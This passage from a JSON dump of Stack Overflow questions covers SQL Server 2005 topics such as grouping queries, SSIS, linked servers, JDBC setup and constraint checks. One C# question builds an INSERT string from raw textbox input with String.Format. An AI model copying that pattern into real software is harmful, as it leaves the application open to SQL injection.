row.</p>\n"},{"tags":["sql","tsql","sql-server-2005","sql-date-functions"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":80,"score":-1,"question_id":11088088,"title":"how to get max of every month of every year","body":"<p>wel if you have a mastertable any columns example\nmastertable columns\ncreatedon,modifiedon,name,id</p>\n\n<p>detailtable has\ncreatedon,modifiedon,name,id,mastertableid</p>\n\n<p>now every month is added automatically a row on master\nand it could have many rows on detail for this master, so\nwhen one user doesn't want to wait for next month he run the process which create\na new row on master, and others rows on detail.\nso.so for this month i'll have two masters,\nnow i need do a select only with year, and month\nand if i do this select, this sum detail of first master generated automatically and the second master generated for user, now i dont want it happened, i want only one.\ni dont mind if this is the last, or it is the first, so i need one</p>\n\n<p>then my question is, how do i select the last master created?(for every month for every year)\nso i dont mind if this last was created for user, or autimaticallity, only i need the last master, and its details </p>\n\n<p>this is my current query but this select all</p>\n\n<pre><code>SELECT \n    createdby\n    , createdbyname\n    , createdbyyominame\n    , createdon\n    , createdonutc\n    , createdonbehalfby\n    , createdonbehalfbyname\n    , createdonbehalfbyyominame\n    , importsequencenumber\n    , modifiedby\n    , modifiedbyname\n    , modifiedbyyominame\n    , modifiedon\n    , modifiedonutc\n    , modifiedonbehalfbyname\n    , modifiedonbehalfbyyominame\n    , modifiedonbehalfby\n    , ope_censoid\n    , ope_name\n    , ope_rutasid\n    , ope_rutasidname\n    , organizationid\n    , organizationidname\n    , overriddencreatedon\n    , overriddencreatedonutc\n    , statecode\n    , statecodename\n    , StatusCode\n    , statuscodename\n    , timezoneruleversionnumber\n    , utcconversiontimezonecode  \nFROM \n    ope_censo  \nORDER BY \n    ope_censoid\n    , modifiedon\n</code></pre>\n\n<p>and i got this result with the last query</p>\n\n<pre><code>createdby                               createdbyname                createdbyyominame           createdon     createdonutc createdonbehalfby   createdonbehalfbyname   createdonbehalfbyyominame   importsequencenumber    modifiedby  modifiedbyname  modifiedbyyominame  modifiedon  modifiedonutc   modifiedonbehalfbyname  modifiedonbehalfbyyominame  modifiedonbehalfby  ope_censoid ope_name    ope_rutasid ope_rutasidname organizationid\n71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-01 07:03:24.000 NULL    NULL    NULL    NULL    NULL    71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-01 07:03:24.000 NULL    NULL    NULL    NULL    581EB2D0-A24C-E111-97AC-005056977FBC    1 - Febrero - 2012  FF7C3DBD-3EBA-E011-8C48-005056977FBC    R 197 AGUA PURIF HOG LOC    F94F39E4-7C6B-E011-8C48-005056977FBC\n71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-13 15:33:41.000 NULL    NULL    NULL    NULL    NULL    71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-13 15:33:41.000 NULL    NULL    NULL    NULL    63FFFF15-5856-E111-97AC-005056977FBC    13 - Febrero - 2012 FF7C3DBD-3EBA-E011-8C48-005056977FBC    R 197 AGUA PURIF HOG LOC    F94F39E4-7C6B-E011-8C48-005056977FBC\n71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-24 00:29:27.000 NULL    NULL    NULL    NULL    NULL    71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-24 00:29:27.000 NULL    NULL    NULL    NULL    3D14A09B-7E5E-E111-97AC-005056977FBC    23 - Febrero - 2012 FF7C3DBD-3EBA-E011-8C48-005056977FBC    R 197 AGUA PURIF HOG LOC    F94F39E4-7C6B-E011-8C48-005056977FBC\n71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-01 07:02:57.000 NULL    NULL    NULL    NULL    NULL    71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-01 07:02:57.000 NULL    NULL    NULL    NULL    7F53A7C4-A24C-E111-97AC-005056977FBC    1 - Febrero - 2012  CC7C3DBD-3EBA-E011-8C48-005056977FBC    R128 AGUA PURIF HOG LOC F94F39E4-7C6B-E011-8C48-005056977FBC\n71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-13 15:33:28.000 NULL    NULL    NULL    NULL    NULL    71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-13 15:33:28.000 NULL    NULL    NULL    NULL    49540510-5856-E111-97AC-005056977FBC    13 - Febrero - 2012 CC7C3DBD-3EBA-E011-8C48-005056977FBC    R128 AGUA PURIF HOG LOC F94F39E4-7C6B-E011-8C48-005056977FBC\n71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-24 00:37:06.000 NULL    NULL    NULL    NULL    NULL    71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-24 00:37:06.000 NULL    NULL    NULL    NULL    753C4BAD-7F5E-E111-97AC-005056977FBC    23 - Febrero - 2012 CC7C3DBD-3EBA-E011-8C48-005056977FBC    R128 AGUA PURIF HOG LOC F94F39E4-7C6B-E011-8C48-005056977FBC\n71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-01 07:06:55.000 NULL    NULL    NULL    NULL    NULL    71D3CE46-1B71-E011-8C48-005056977FBC    Administrador CRM BBebidas  Administrador CRM BBebidas  2012-02-01 07:06:55.000 NULL    NULL    NULL    NULL    88650A4F-A34C-E111-97AC-005056977FBC    1 - Febrero - 2012  CD7C3DBD-3EBA-E011-8C48-005056977FBC    R129 AGUA PURIF HOG LOC F94F39E4-7C6B-E011-8C48-005056977FBC\n</code></pre>\n\n<p>so you could see for \"rutaidname\" i have 3 times to \"R 197 AGUA PURIF HOG LOC\" so\nyou could see createdon was created on february 2012 i wanted select the last for this\n\"rutasidname\" and so, if this \"rutaidname\" has and other month (one o more rows) i want \nthe last for that month, so, i need for every \"rutaidname\" the rows where createdon was the last, for every month, for every year.\nexample for \"R 197 AGUA PURIF HOG LOC\"  i want the last of february 2011, the last master for \"march 2011\" the lsat master for \"april 2011\". </p>\n"},{"tags":["sql-server-2005","xml-namespaces","for-xml-path"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":330,"score":1,"question_id":11090866,"title":"How to add namespaces to root node in SQL Server 2005 using XML FOR PATH","body":"<p>I've created Select...FOR XML PATH statement using SQL Server 2005 and need to add several namespaces and schema reference to the root node. </p>\n\n<pre><code>xsi:schemaLocation=\"http://somewhere/v1/ schemaname.xsd\"\nxmlns=\"http://somewhere/v1/\"\nxmlns:lom=\"http://somewhere/lom/v1/\"\nxmlns:a=\"http://somewhere/a/v1/\"\nxmlns:cf=\"http://somewhere/cf/v1/\"\nxmlns:co=\"http://somewhere/co/v1/\"\nxmlns:hx=\"http://somewhere/hx/v1/\" \nxmlns:m=\"http://somewhere/m/v1/\" \nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n</code></pre>\n\n<p>Any pointers would be greatly appreciated.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":81,"score":0,"question_id":11088428,"title":"SQL Server 2005 install stored procedure","body":"<p>I'm trying to install the stored procedure <a href=\"http://sqlblog.com/files/folders/beta/entry42453.aspx\" rel=\"nofollow\">WhoIsActive</a>, but have no clue where to put it. </p>\n\n<p>I thought it was supposed to go in the Bin folder but I believe it's only for DLLs. How do you install a stored procedure in SQL Server 2005? </p>\n\n<p>I would like to call it using </p>\n\n<pre><code>Exec dbo.sp_WhoIsActive \n</code></pre>\n\n<p>since it has some parameters that I can use with it</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":11057729,"title":"How can I make a this selection of groups and members simpler and more efficient?","body":"<h1>Background</h1>\n\n<p>I've got a <strong>group</strong> table, <strong>users</strong> table, and a <strong>group_members</strong> table.</p>\n\n<pre><code>groups { group_ varchar(50) not null, etc... }\nusers  { user_id varchar(50) not null, etc... }\ngroup_members { group_ varchar(50 not null, member varchar(50) not null }\n</code></pre>\n\n<p>My requirements state that a group can have other groups as members.  The user needs to be considered a member of all groups that any group they are a member of.<br>\nFor Example, consider the following data in these tables:</p>\n\n<pre><code>group_members              | groups         | users    |\n========================== | ============== | ======== |\ngroup_          member     | group_         | user_id  |\n-------------------------- | -------------- | -------- |\n'SYSTEM_ADMIN'  'OE_ADMIN' | 'SYSTEM_ADMIN' | 'USER    |\n'SYSTEM_ADMIN'  'AR_ADMIN' | 'OE_ADMIN'     |          |\n'SYSTEM_ADMIN'  'USER'     | 'AR_ADMIN'     |          |\n</code></pre>\n\n<p>My desired result of asking the question \n<strong>What groups is 'USER' a member of?</strong> should be </p>\n\n<pre><code>member\n==============\n'SYSTEM_ADMIN'\n'OE_ADMIN'\n'AR_ADMIN'\n</code></pre>\n\n<h1>Question</h1>\n\n<p>I've got the following query built and providing me with the required results, but it looks a little complex.</p>\n\n<pre><code>WITH GM\nAS (\n    SELECT GROUP_, MEMBER FROM group_members \n       WHERE member IN (SELECT group_ FROM groups)\n)\nSELECT group_ FROM group_members WHERE member = 'USER'\nUNION\nSELECT MEMBER AS GROUP_ FROM GM \n   WHERE group_ in (SELECT group_ FROM group_members WHERE member = 'USER')\n</code></pre>\n\n<p>Any suggestions on how to make this query simpler, or less cluttered?</p>\n"},{"tags":["asp.net-mvc","asp.net-mvc-3","visual-studio-2010","sql-server-2005","reporting-services"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1386,"score":1,"question_id":5734626,"title":"Visual Studio 2010 - ASP.NET MVC3 app - SSRS on SQL Server 2005","body":"<p>I'm a bit new to SSRS... I have an MVC3 application which I need to show SQL Server reports from a SQL Server 2005 database. Is this possible? I ask because my google searches indicated some problems with VS2008/SQL Server 2005, so wanted to know if these issues still persist for VS2010.</p>\n\n<p>Also, is it pretty straight forward to embed the Report Viewer control in an MVC3 application? I've seen a few posts, but not too much details yet.</p>\n\n<p>Links and feedback would be very much appreciated. Another question -- do I do the report designing directly in my web-app / report viewer? Or, do I have to design the report first (e.g. in a \"Report Application\")? </p>\n"},{"tags":["web-services","sql-server-2005","database-replication"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":299,"score":1,"question_id":7799092,"title":"Synchronize changes in SQL Server database with its remote client databases","body":"<p>Which is the best way to synchronize a SQL Server database with its remote client databases? Web services/any other built-in features available in SQL Server? </p>\n\n<p>Application details:- Wpf desktop with SQL Server 2005. </p>\n\n<p>The scenario is clients main office having stock management database. Same database structure implemented in clients remote outlets. New stocks are adding in main office database. Whenever a new row is added to head-office database, need to inform all remote client SQL Server databases. And whenever a change happens in remote client outlet, need to send back the changes to main office database. </p>\n\n<p>Thanks in advance.  </p>\n"},{"tags":["sql-server-2005","ram"],"answer_count":7,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":30937,"score":7,"question_id":1289558,"title":"How much RAM is SQL Server actually using?","body":"<p>I am debugging one of my apps and noticed that the RAM on my SQL Server 2005 x64 box (running on a Windows 2003 R2 x64 ) is pegged and even going into the paging file.  </p>\n\n<p>I understand that SQL Server 2005 x64 just grabs everything it can, so this might be normal (???).  How can I check how much memory it is actually using?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":99,"score":-1,"question_id":10580529,"title":"Update in an Order By series","body":"<p>I need to run an <code>UPDATE</code> statement over multiple records in an <code>ORDER BY</code> series. This is because my update includes a scalar function, which uses the early updated value. Can anyone suggest a better way <strong>other than looping through</strong> in the desired order? </p>\n\n<hr>\n\n<p>Sorry I should have done it very earlier, The Scenario is..</p>\n\n<p>My problem was I have a table variable and it has hierarchical records, </p>\n\n<h2>ID  SlNo    result</h2>\n\n<p>1   1.0 True</p>\n\n<p>2   1.1 True</p>\n\n<p>3   1.1.1   True    </p>\n\n<p>4   1.1.2   False   </p>\n\n<p>5   1.2 True</p>\n\n<p>6   1.2.1   False  </p>\n\n<p>7   1.2.2   False </p>\n\n<p>8   1.2.3   False </p>\n\n<p>9   1.2.4   False </p>\n\n<p>And the tree structure is,</p>\n\n<p>1.0</p>\n\n<pre><code>1.0 &gt; 1.1\n\n1.0 &gt; 1.1 &gt; 1.1.1\n</code></pre>\n\n<p>1.0 > 1.1 > 1.1.2</p>\n\n<p>1.0 > 1.2 </p>\n\n<p>1.0 > 1.2 > 2.2.1</p>\n\n<p>1.0 > 1.2 > 2.2.2</p>\n\n<p>1.0 > 1.2 > 2.2.3</p>\n\n<p>1.0 > 1.2 > 2.2.4   </p>\n\n<p>I want to update the results to a table and if all the child branches are \"False\" then its parent should go as \"False\". For that I need to update rows in the \"descending Order\" and also must see all its child branches are \"False\". Can i do it in a single update statement? How can I say Order by in My Update Query?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":325,"score":2,"question_id":7261053,"title":"SQL Server 2005 Linked server not finding tables","body":"<p>I have a linked server where I can clearly see all the databases and tables, so I know the server is properly linked. However, when I try to execute a query, it says invalid object name, at the linked server's table. </p>\n\n<p>The linked server is aliased as TCS, therefore, my query takes that table as </p>\n\n<pre><code>FROM [TCS].dbo.table as b  \n</code></pre>\n\n<p>I have also tried including the database name also as FROM [TCS\\db1].dbo.table.</p>\n\n<p>What am I missing here?</p>\n"},{"tags":["java","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":336,"score":0,"question_id":7482414,"title":"Attempt to connect to SQL Server causes ClassNotFoundException","body":"<pre><code>import java.sql.*;\n\npublic class MysqlConnect {\n    public static void main(String[] args) {\n        System.out.println(\"MySQL Connect Example.\");\n        Connection conn = null;\n        String url = \"\\\\host/context/\";\n        String dbName = \"theDatabaseName\";\n        String driver = \"com.microsoft.sqlserver.jdbc.SQLServerDriver \";\n        String userName = \"theUserName\";\n        String password = \"thePassword\";\n        try {\n            Class.forName(driver).newInstance();\n            conn = DriverManager.getConnection(url + dbName, userName, password);\n            System.out.println(\"Connected to the database\");\n            conn.close();\n            System.out.println(\"Disconnected from database\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre>\n\n<p>I am facing problem while the running this code.</p>\n\n<p>I have already downloaded the SQL Server driver (sqljdbc), set it in the class path and copied it into the java/lib directory, but still I am getting the same result: <code>ClassNotFoundException</code>.</p>\n\n<p>Can anybody help me?</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","ssms"],"answer_count":5,"favorite_count":4,"up_vote_count":8,"down_vote_count":0,"view_count":3657,"score":8,"question_id":935849,"title":"SQL Server Management Studio - using multiple filters in table list?","body":"<p>In Management Studio, you can right click on the tables group to create a filter for the table list. Has anyone figured out a way to include multiple tables in the filter? For example, I'd like all tables with \"br_*\" and \"tbl_*\" to show up. </p>\n\n<p>Anyone know how to do this?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","index","data-warehouse","olap","star-schema"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":86,"score":1,"question_id":11056330,"title":"Usefulness of a covering index on a fact table","body":"<p>Consider a fact table of the form:</p>\n\n<pre><code>CREATE TABLE Fact1\n(\n    Dim1 int NOT NULL,\n    Dim2 int NOT NULL,\n    Dim3 int NOT NULL,\n    Data1 int NOT NULL,\n    Data2 int NOT NULL\n    ...\n)\n</code></pre>\n\n<p><code>Fact1</code> has a single column index on each of the dimensions. <code>Dim1</code> is assumed to be the time dimension with a granularity down to range of hours (e.g. between 2 PM and 6 PM on March 12 2011). Would it be useful to include <code>Dim2</code> and <code>Dim3</code> as covering columns within Dim1? Or likewise on any of them?</p>\n\n<p>More generally, would it ever be useful to include the other dimension table FK columns as a covering column on an index for a given dimension?</p>\n\n<p><em>Note: For the fact table, we are assuming there is no need to uniquely identify a given fact. Hence, the lack of a primary key or surrogate key. The uniqueness is guaranteed by (Dim1, Dim2, Dim3) always being a unique tuple.</em></p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":11064379,"title":"How to handle non tabular data?","body":"<p>I have site terms, about and contact modules on my website. I want to be able to change these items via CMS and not via changing .ASPX pages every once in a while. My question is how to store this data ? I used to store this kind of data in SqlServer but i always thought it is an overkill since data is a single row with different columns especially when in some cases i just need one column.</p>\n\n<p>How do you handle this issue ?</p>\n"},{"tags":["sql","tsql","sql-server-2005","ssis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":11054580,"title":"Why the logid output parameter is not returning an intended value.","body":"<p>Why the logid output parameter is not returning an intended value, i mean the last value of the unique identifier column?</p>\n\n<p>Below given a t-sql code. I am passing certain variables to the proc and inserting it into a table and getting the last value of unique identifier to a variable @logid. But it is not working as intended. Please have a look:</p>\n\n<pre><code>ALTER PROCEDURE proc_name\n(\n    @PID int\n    ,@Description varchar(50) = null\n    ,@LogID integer output\n    ,@Msg varchar(500) output\n\n)\n</code></pre>\n\n<p>With execute as caller as: set nocount on;</p>\n\n<pre><code>BEGIN\n\n----variables value assignment \n\nBEGIN TRY\n\n\n    insert into logging.execution_log\n    (\n\n    ParentLogID, Description, PackageName, PackageGuid, MachineName,\n    ExecutionGuid, LogicalDate, Operator, StartTime, EndTime, Status, FailureTask\n\n    )\n\n    select @ParentLogID, @Description, @PackageName, cast(@PackageGuid as uniqueidentifier),\n         @MachineName, cast(@ExecutionGuid as uniqueidentifier),\n        @logicalDate, @operator, getdate(), null, @status, null\n\n    SET @LogID = cast(scope_identity() as int)\n\n\nEND TRY\n\nBEGIN CATCH\n    set @ErrorMsg =ERROR_MESSAGE()\n\nEND CATCH\n\nEND\n</code></pre>\n"},{"tags":["sql-server-2005","transitive-closure-table"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":718,"score":3,"question_id":1104977,"title":"How to get the parent given a child in SQL SERVER 2005","body":"<p>I have a table like this</p>\n\n<pre><code>childid      parentid\n------------------------\n1   \t0\n2   \t1\n3   \t2\n4   \t2\n5   \t3\n6   \t4\n7   \t0\n8   \t7\n9   \t8\n10  \t1\n</code></pre>\n\n<p>If I give a childid as 5, the parentid will be 1(output)</p>\n\n<p>If I give a childid as 9, the parentid will be 7.(output)</p>\n\n<p>i.e. the root parentid is 0 and the query should stop there.</p>\n\n<p>How to solve such a query?</p>\n\n<p>Please help.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","query","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":340,"score":-2,"question_id":10663843,"title":"joining two select queries results in one row for each value?","body":"<p>I have a table called <code>CharUser</code> has the following data</p>\n\n<pre><code>UserID UserName UserPhone UserAddress\n</code></pre>\n\n<p>also a table called <code>subscriptionjob</code></p>\n\n<pre><code>subID userId   companyid\n</code></pre>\n\n<p>another table called user <code>UsersCvs</code> has the following data</p>\n\n<pre><code>CVId   Companyuserid   cvpath\n</code></pre>\n\n<p>I want to do a query that result as the following for each row</p>\n\n<pre><code>userid   username   userphone  useraddress usercv\n</code></pre>\n\n<p>the userid is given from the <code>subcriptionjob</code> table\ni tried the following\nthe first query </p>\n\n<pre><code>SELECT        CharUserId, CharUserName, CharUserPassword, CharUserMail, CharUserPhone, CharUserAddress, CharUserGender, ProgId, CharUserBirthdate\nFROM            CharUser\nWHERE        (CharUserId IN\n                             (SELECT        CompanyUserId\n                                FROM            SubsciptionJob\n                                WHERE        (JobId = 1)))\n</code></pre>\n\n<p>and this the second query </p>\n\n<pre><code>SELECT        TOP (1) CvPath\nFROM            UsersCvs\nWHERE        (CompanyUserId IN\n                             (SELECT        CompanyUserId\n                                FROM            SubsciptionJob AS SubsciptionJob_1\n                                WHERE        (JobId = 1)))\nORDER BY CvId DESC\n</code></pre>\n\n<p>Both work alone just fine\ni tried to combine them putting union in between but it doesn't work</p>\n\n<p>i want to attach the cvpath column to the first query with a unique value for each row</p>\n\n<p>any ideas.. ?</p>\n\n<p>thank you</p>\n"},{"tags":["sql","sql-server","sql-server-2008","query","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":134,"score":-1,"question_id":11057866,"title":"USing IF..Then..Else with select queries?","body":"<p>I have 3 tables like this :</p>\n\n<pre><code>comment table :\ncommentId pid    sid       text      vid\n1          1     null    comment 1    1\n2         null    1     comment 2    1\n3          2     null    comment 3    1\n\n\nstudent table\nsid     firstname   lastname\n1         john       adam\n2         joan       adam\n\nprofessor table :\n\npid    firstname   lastname\n1       mark        abram\n2       sean        hoak\n\n\n\ni want to make a qeury so the result to return like this :\nfirstname    lastname\nmark          abram\njohn          adam\nsean          hoak\n</code></pre>\n\n<p>m</p>\n\n<p>if (select query ==null) then (selec query 1) else select (query 2)</p>\n\n<p>i tried the following :</p>\n\n<pre><code>if((select pid from comment==null)\nthen select student.firstname , student.lastname from student where sid in (select sid from comment where vid=1)\n\nelse\n(select professor.firstname ,professor.lastname from professor where pid in (select pid from comment where vid=1)\n</code></pre>\n\n<p>but with no use</p>\n\n<p>any ideas how to achieve the wanted result ?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","non-clustered-index"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":10803226,"title":"Row Locator in Non Clustered Index","body":"<p>I was reading about <code>Non Clustered Index</code> which says that \"<code>Nonclustered</code> index contain only the values from the indexed columns and row locators that point to the actual data rows, rather than contain the data rows themselves. This means that the query engine must take an additional step in order to locate the actual data.\"</p>\n\n<p><strong>Query</strong> - I am not clear with <code>Row Locator</code>. I am assuming that it is not any <code>Primary key</code>. There is something happening in background which has to do with <code>Row-Locator</code> to uniquely identify the row.</p>\n"},{"tags":["php","sql-server-2005","iis6","windows-server-2003"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":109,"score":1,"question_id":11054287,"title":"SQL Server 2005 php 5.2","body":"<p>I'm having a really difficult time trying to get php to connect to SQL Server 2005.  It seems like no matter what I do or what page I visit, I either get the wrong extension/driver or find a dead link.  The most recent attempt was php_sqlsrv_52_ts_vc6.dll which apparently doesn't support anything prior to 2008.</p>\n\n<p>After over two days of searching, I'm lost, and upgrading either php or SQL Server is not an option unfortunately...</p>\n\n<p>EDIT:\nEverything is running on IIS 6 - Server 2003 (Same box).</p>\n"},{"tags":["c#","asp.net","database","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":376,"score":2,"question_id":11054477,"title":"Getting error while store data in sql server 2005 through textbox","body":"<p>I am storing data (approx. 1500 words) in SQL server 2005 through textbox and button. I am using this code.</p>\n\n<pre><code>protected void Button1_Click(object sender, EventArgs e)\n{\n    conn.Open();\n    String query = String.Format(\"insert into try (data,sno) values ('{0}',22)\",TextBox1.Text);\n    SqlCommand cmd = new SqlCommand(query, conn);\n    cmd.ExecuteNonQuery();\n    Label1.Text = \"submitted\";\n    conn.Close();\n}\n</code></pre>\n\n<p>I have column <code>'data'</code> of data type <code>'char(4000)'</code>.</p>\n\n<p>Problem is that, when I store 1st paragraph (approx 1500 words), it stored successfully. But when I stored another paragraph (approx 1500 words), it show me the error.</p>\n\n<blockquote>\n  <p>\"Incorrect syntax near 's'. Unclosed quotation mark after the\n  character string ',22)'.\"</p>\n</blockquote>\n\n<p>What is the problem ??</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":449,"score":1,"question_id":11052078,"title":"SQL Server factors that can contribute to high CPU usage","body":"<p>I am trying to figure out or enlist factors that contribute to persistent high CPU utilization related to SQL Server</p>\n\n<p>Here are few that I came up with</p>\n\n<p>a) Compilation or Frequent Recompilation of stored procs or queries</p>\n\n<p>b) Poor performing queries that perform huge sort or ended up using Hash Join </p>\n\n<p>c) Parallelism (multiple threads are span so it can keep CPU busy)</p>\n\n<p>d) Looping construct in T-SQL for e.g. WHILE Loop or use of CURSOR</p>\n\n<p>e) Missing or inappropriate indexes that leads to table scan</p>\n\n<p>What are other SQL server operations can lead for a high CPU use? </p>\n"},{"tags":["sql","sql-server-2005","join","duplicate-removal"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":84,"score":0,"question_id":11041656,"title":"Remove dups on one side but not on the other in SQL JOIN","body":"<p><strong>code updated:</strong>\nAdded [score] column to #left table. The join must pull student name <em>and</em> score from #left table. Any one score is fine but it should not pull duplicate student_id. I am thinking cursor can do it?</p>\n\n<hr>\n\n<p>I am running this report. The problem is similar to the the script that I created. To sum up, I have two tables lets call it #left and #right. The #right table is the key one which contains the amount. But the #left table contains the agent name which I must retrieve too.</p>\n\n<pre><code>create table #left (\nid int not null primary key identity,\nstudent_id int, name varchar(20),score int)\n\ninsert into #left values( 1, 'James',10)\ninsert into #left values( 2, 'Parker',20)\ninsert into #left values( 3, 'Smith',30)\ninsert into #left values( 4, 'Rog',40)\ninsert into #left values( 1, 'James',50)\ninsert into #left values( 2, 'Parker',60)\n\ncreate table #right (\nid int not null primary key identity,\nstudent_id int,\namount decimal(5,2)\n)\n\ninsert into #right values (1,5.25)\ninsert into #right values (3,7.25)\ninsert into #right values (4,3.25)\ninsert into #right values (1,5.25)\n</code></pre>\n\n<p>The problem here is I want to join the two tables on student_id but as you can see #left table contains James and Parker 2 times with the same id. Lets assume this was database mistake.</p>\n\n<p>A similar problem can exists in the #right table. But that is not a mistake. It simply means the #left student was associated with two payments (even if the two payments are the same).</p>\n\n<p><strong>I want to remove dups from #left table and keep the dups in the #right table.</strong></p>\n\n<p>I came up with this query, which works</p>\n\n<pre><code>/* query 1 */\nselect student_id, amount from #right R\nwhere exists\n(\nselect student_id from #left L\nwhere R.student_id = L.student_id\n);\n</code></pre>\n\n<p><strong>But the problem here is I also need to pull the student name</strong> from the other table. Is there a way to do it. It can be any syntax but efficient query is desirable.</p>\n"},{"tags":["sql-server-2005","encoding","ssis","endianness","utf-16"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":98,"score":1,"question_id":11015608,"title":"Does SQL Server 2005 SSIS Support UTF-16BE (Big Endian)?","body":"<p>According to <a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/8c2a1c56-2889-47b2-bee3-5b5651b9ec72\" rel=\"nofollow\">this forum</a>, SSIS only supports UTF-16 Little Endian flat files.  Is that true for all files?  I want to load a UTF-16 BE XML file through SSIS.  Is that supported/possible?</p>\n"},{"tags":["sql-server-2008","sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":11050391,"title":"Execute SSIS package on sql server 2005","body":"<p>I've designed SSIS package, for sql server 2008 in Sql server buisiness inteligence studio. Now i need to execute in on SQL 2005 server. What is the best solution, withoute complitly rewriting package.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":124,"score":2,"question_id":11011364,"title":"Constraints check: TRY/CATCH vs Exists()","body":"<p>I have a table with unique constraint on it:</p>\n\n<pre><code>create table dbo.MyTab\n(\n    MyTabID int primary key identity,\n    SomeValue nvarchar(50)\n);\nCreate Unique Index IX_UQ_SomeValue \nOn dbo.MyTab(SomeValue);\nGo\n</code></pre>\n\n<p>Which code is better to check for duplicates (success = 0 if duplicate found)?</p>\n\n<p><strong>Option 1</strong></p>\n\n<pre><code>Declare @someValue nvarchar(50) = 'aaa'\nDeclare @success bit = 1;\nBegin Try \n    Insert Into MyTab(SomeValue) Values ('aaa');\nEnd Try\nBegin Catch\n    -- lets assume that only constraint errors can happen\n    Set @success = 0;\nEnd Catch\nSelect @success\n</code></pre>\n\n<p><strong>Option 2</strong></p>\n\n<pre><code>Declare @someValue nvarchar(50) = 'aaa'\nDeclare @success bit = 1;\nIF EXISTS (Select 1 From MyTab Where SomeValue = @someValue)\n    Set @success = 0;\nElse \n    Insert Into MyTab(SomeValue) Values ('aaa');\nSelect @success\n</code></pre>\n\n<p>From my point of view- i do believe that <code>Try/Catch</code> is for errors, that were NOT expected (like deadlock or even constraints when duplicates are not expected). In this case- it is possible that sometimes a user will try to submit duplicate, so the error is expected.</p>\n\n<p>I have found <a href=\"http://www.mssqltips.com/sqlservertip/2632/checking-for-potential-constraint-violations-before-entering-sql-server-try-and-catch-logic/\" rel=\"nofollow\">article by Aaron Bertrand</a> that states- checking for duplicates is not much slower even if most of inserts are successful. </p>\n\n<p>There is also loads of advices over the net to use Try/Catch (to avoid 2 statements not 1). In my environment there could be just like 1% of unsuccessful cases, so that kind of makes sense too.</p>\n\n<p>What is your opinion? Whats other reasons to use option 1 OR option 2? </p>\n\n<p>UPDATE: I'm not sure it is important in this case, but table have instead of update trigger (for audit purposes- row deletion also happens through Update statement). 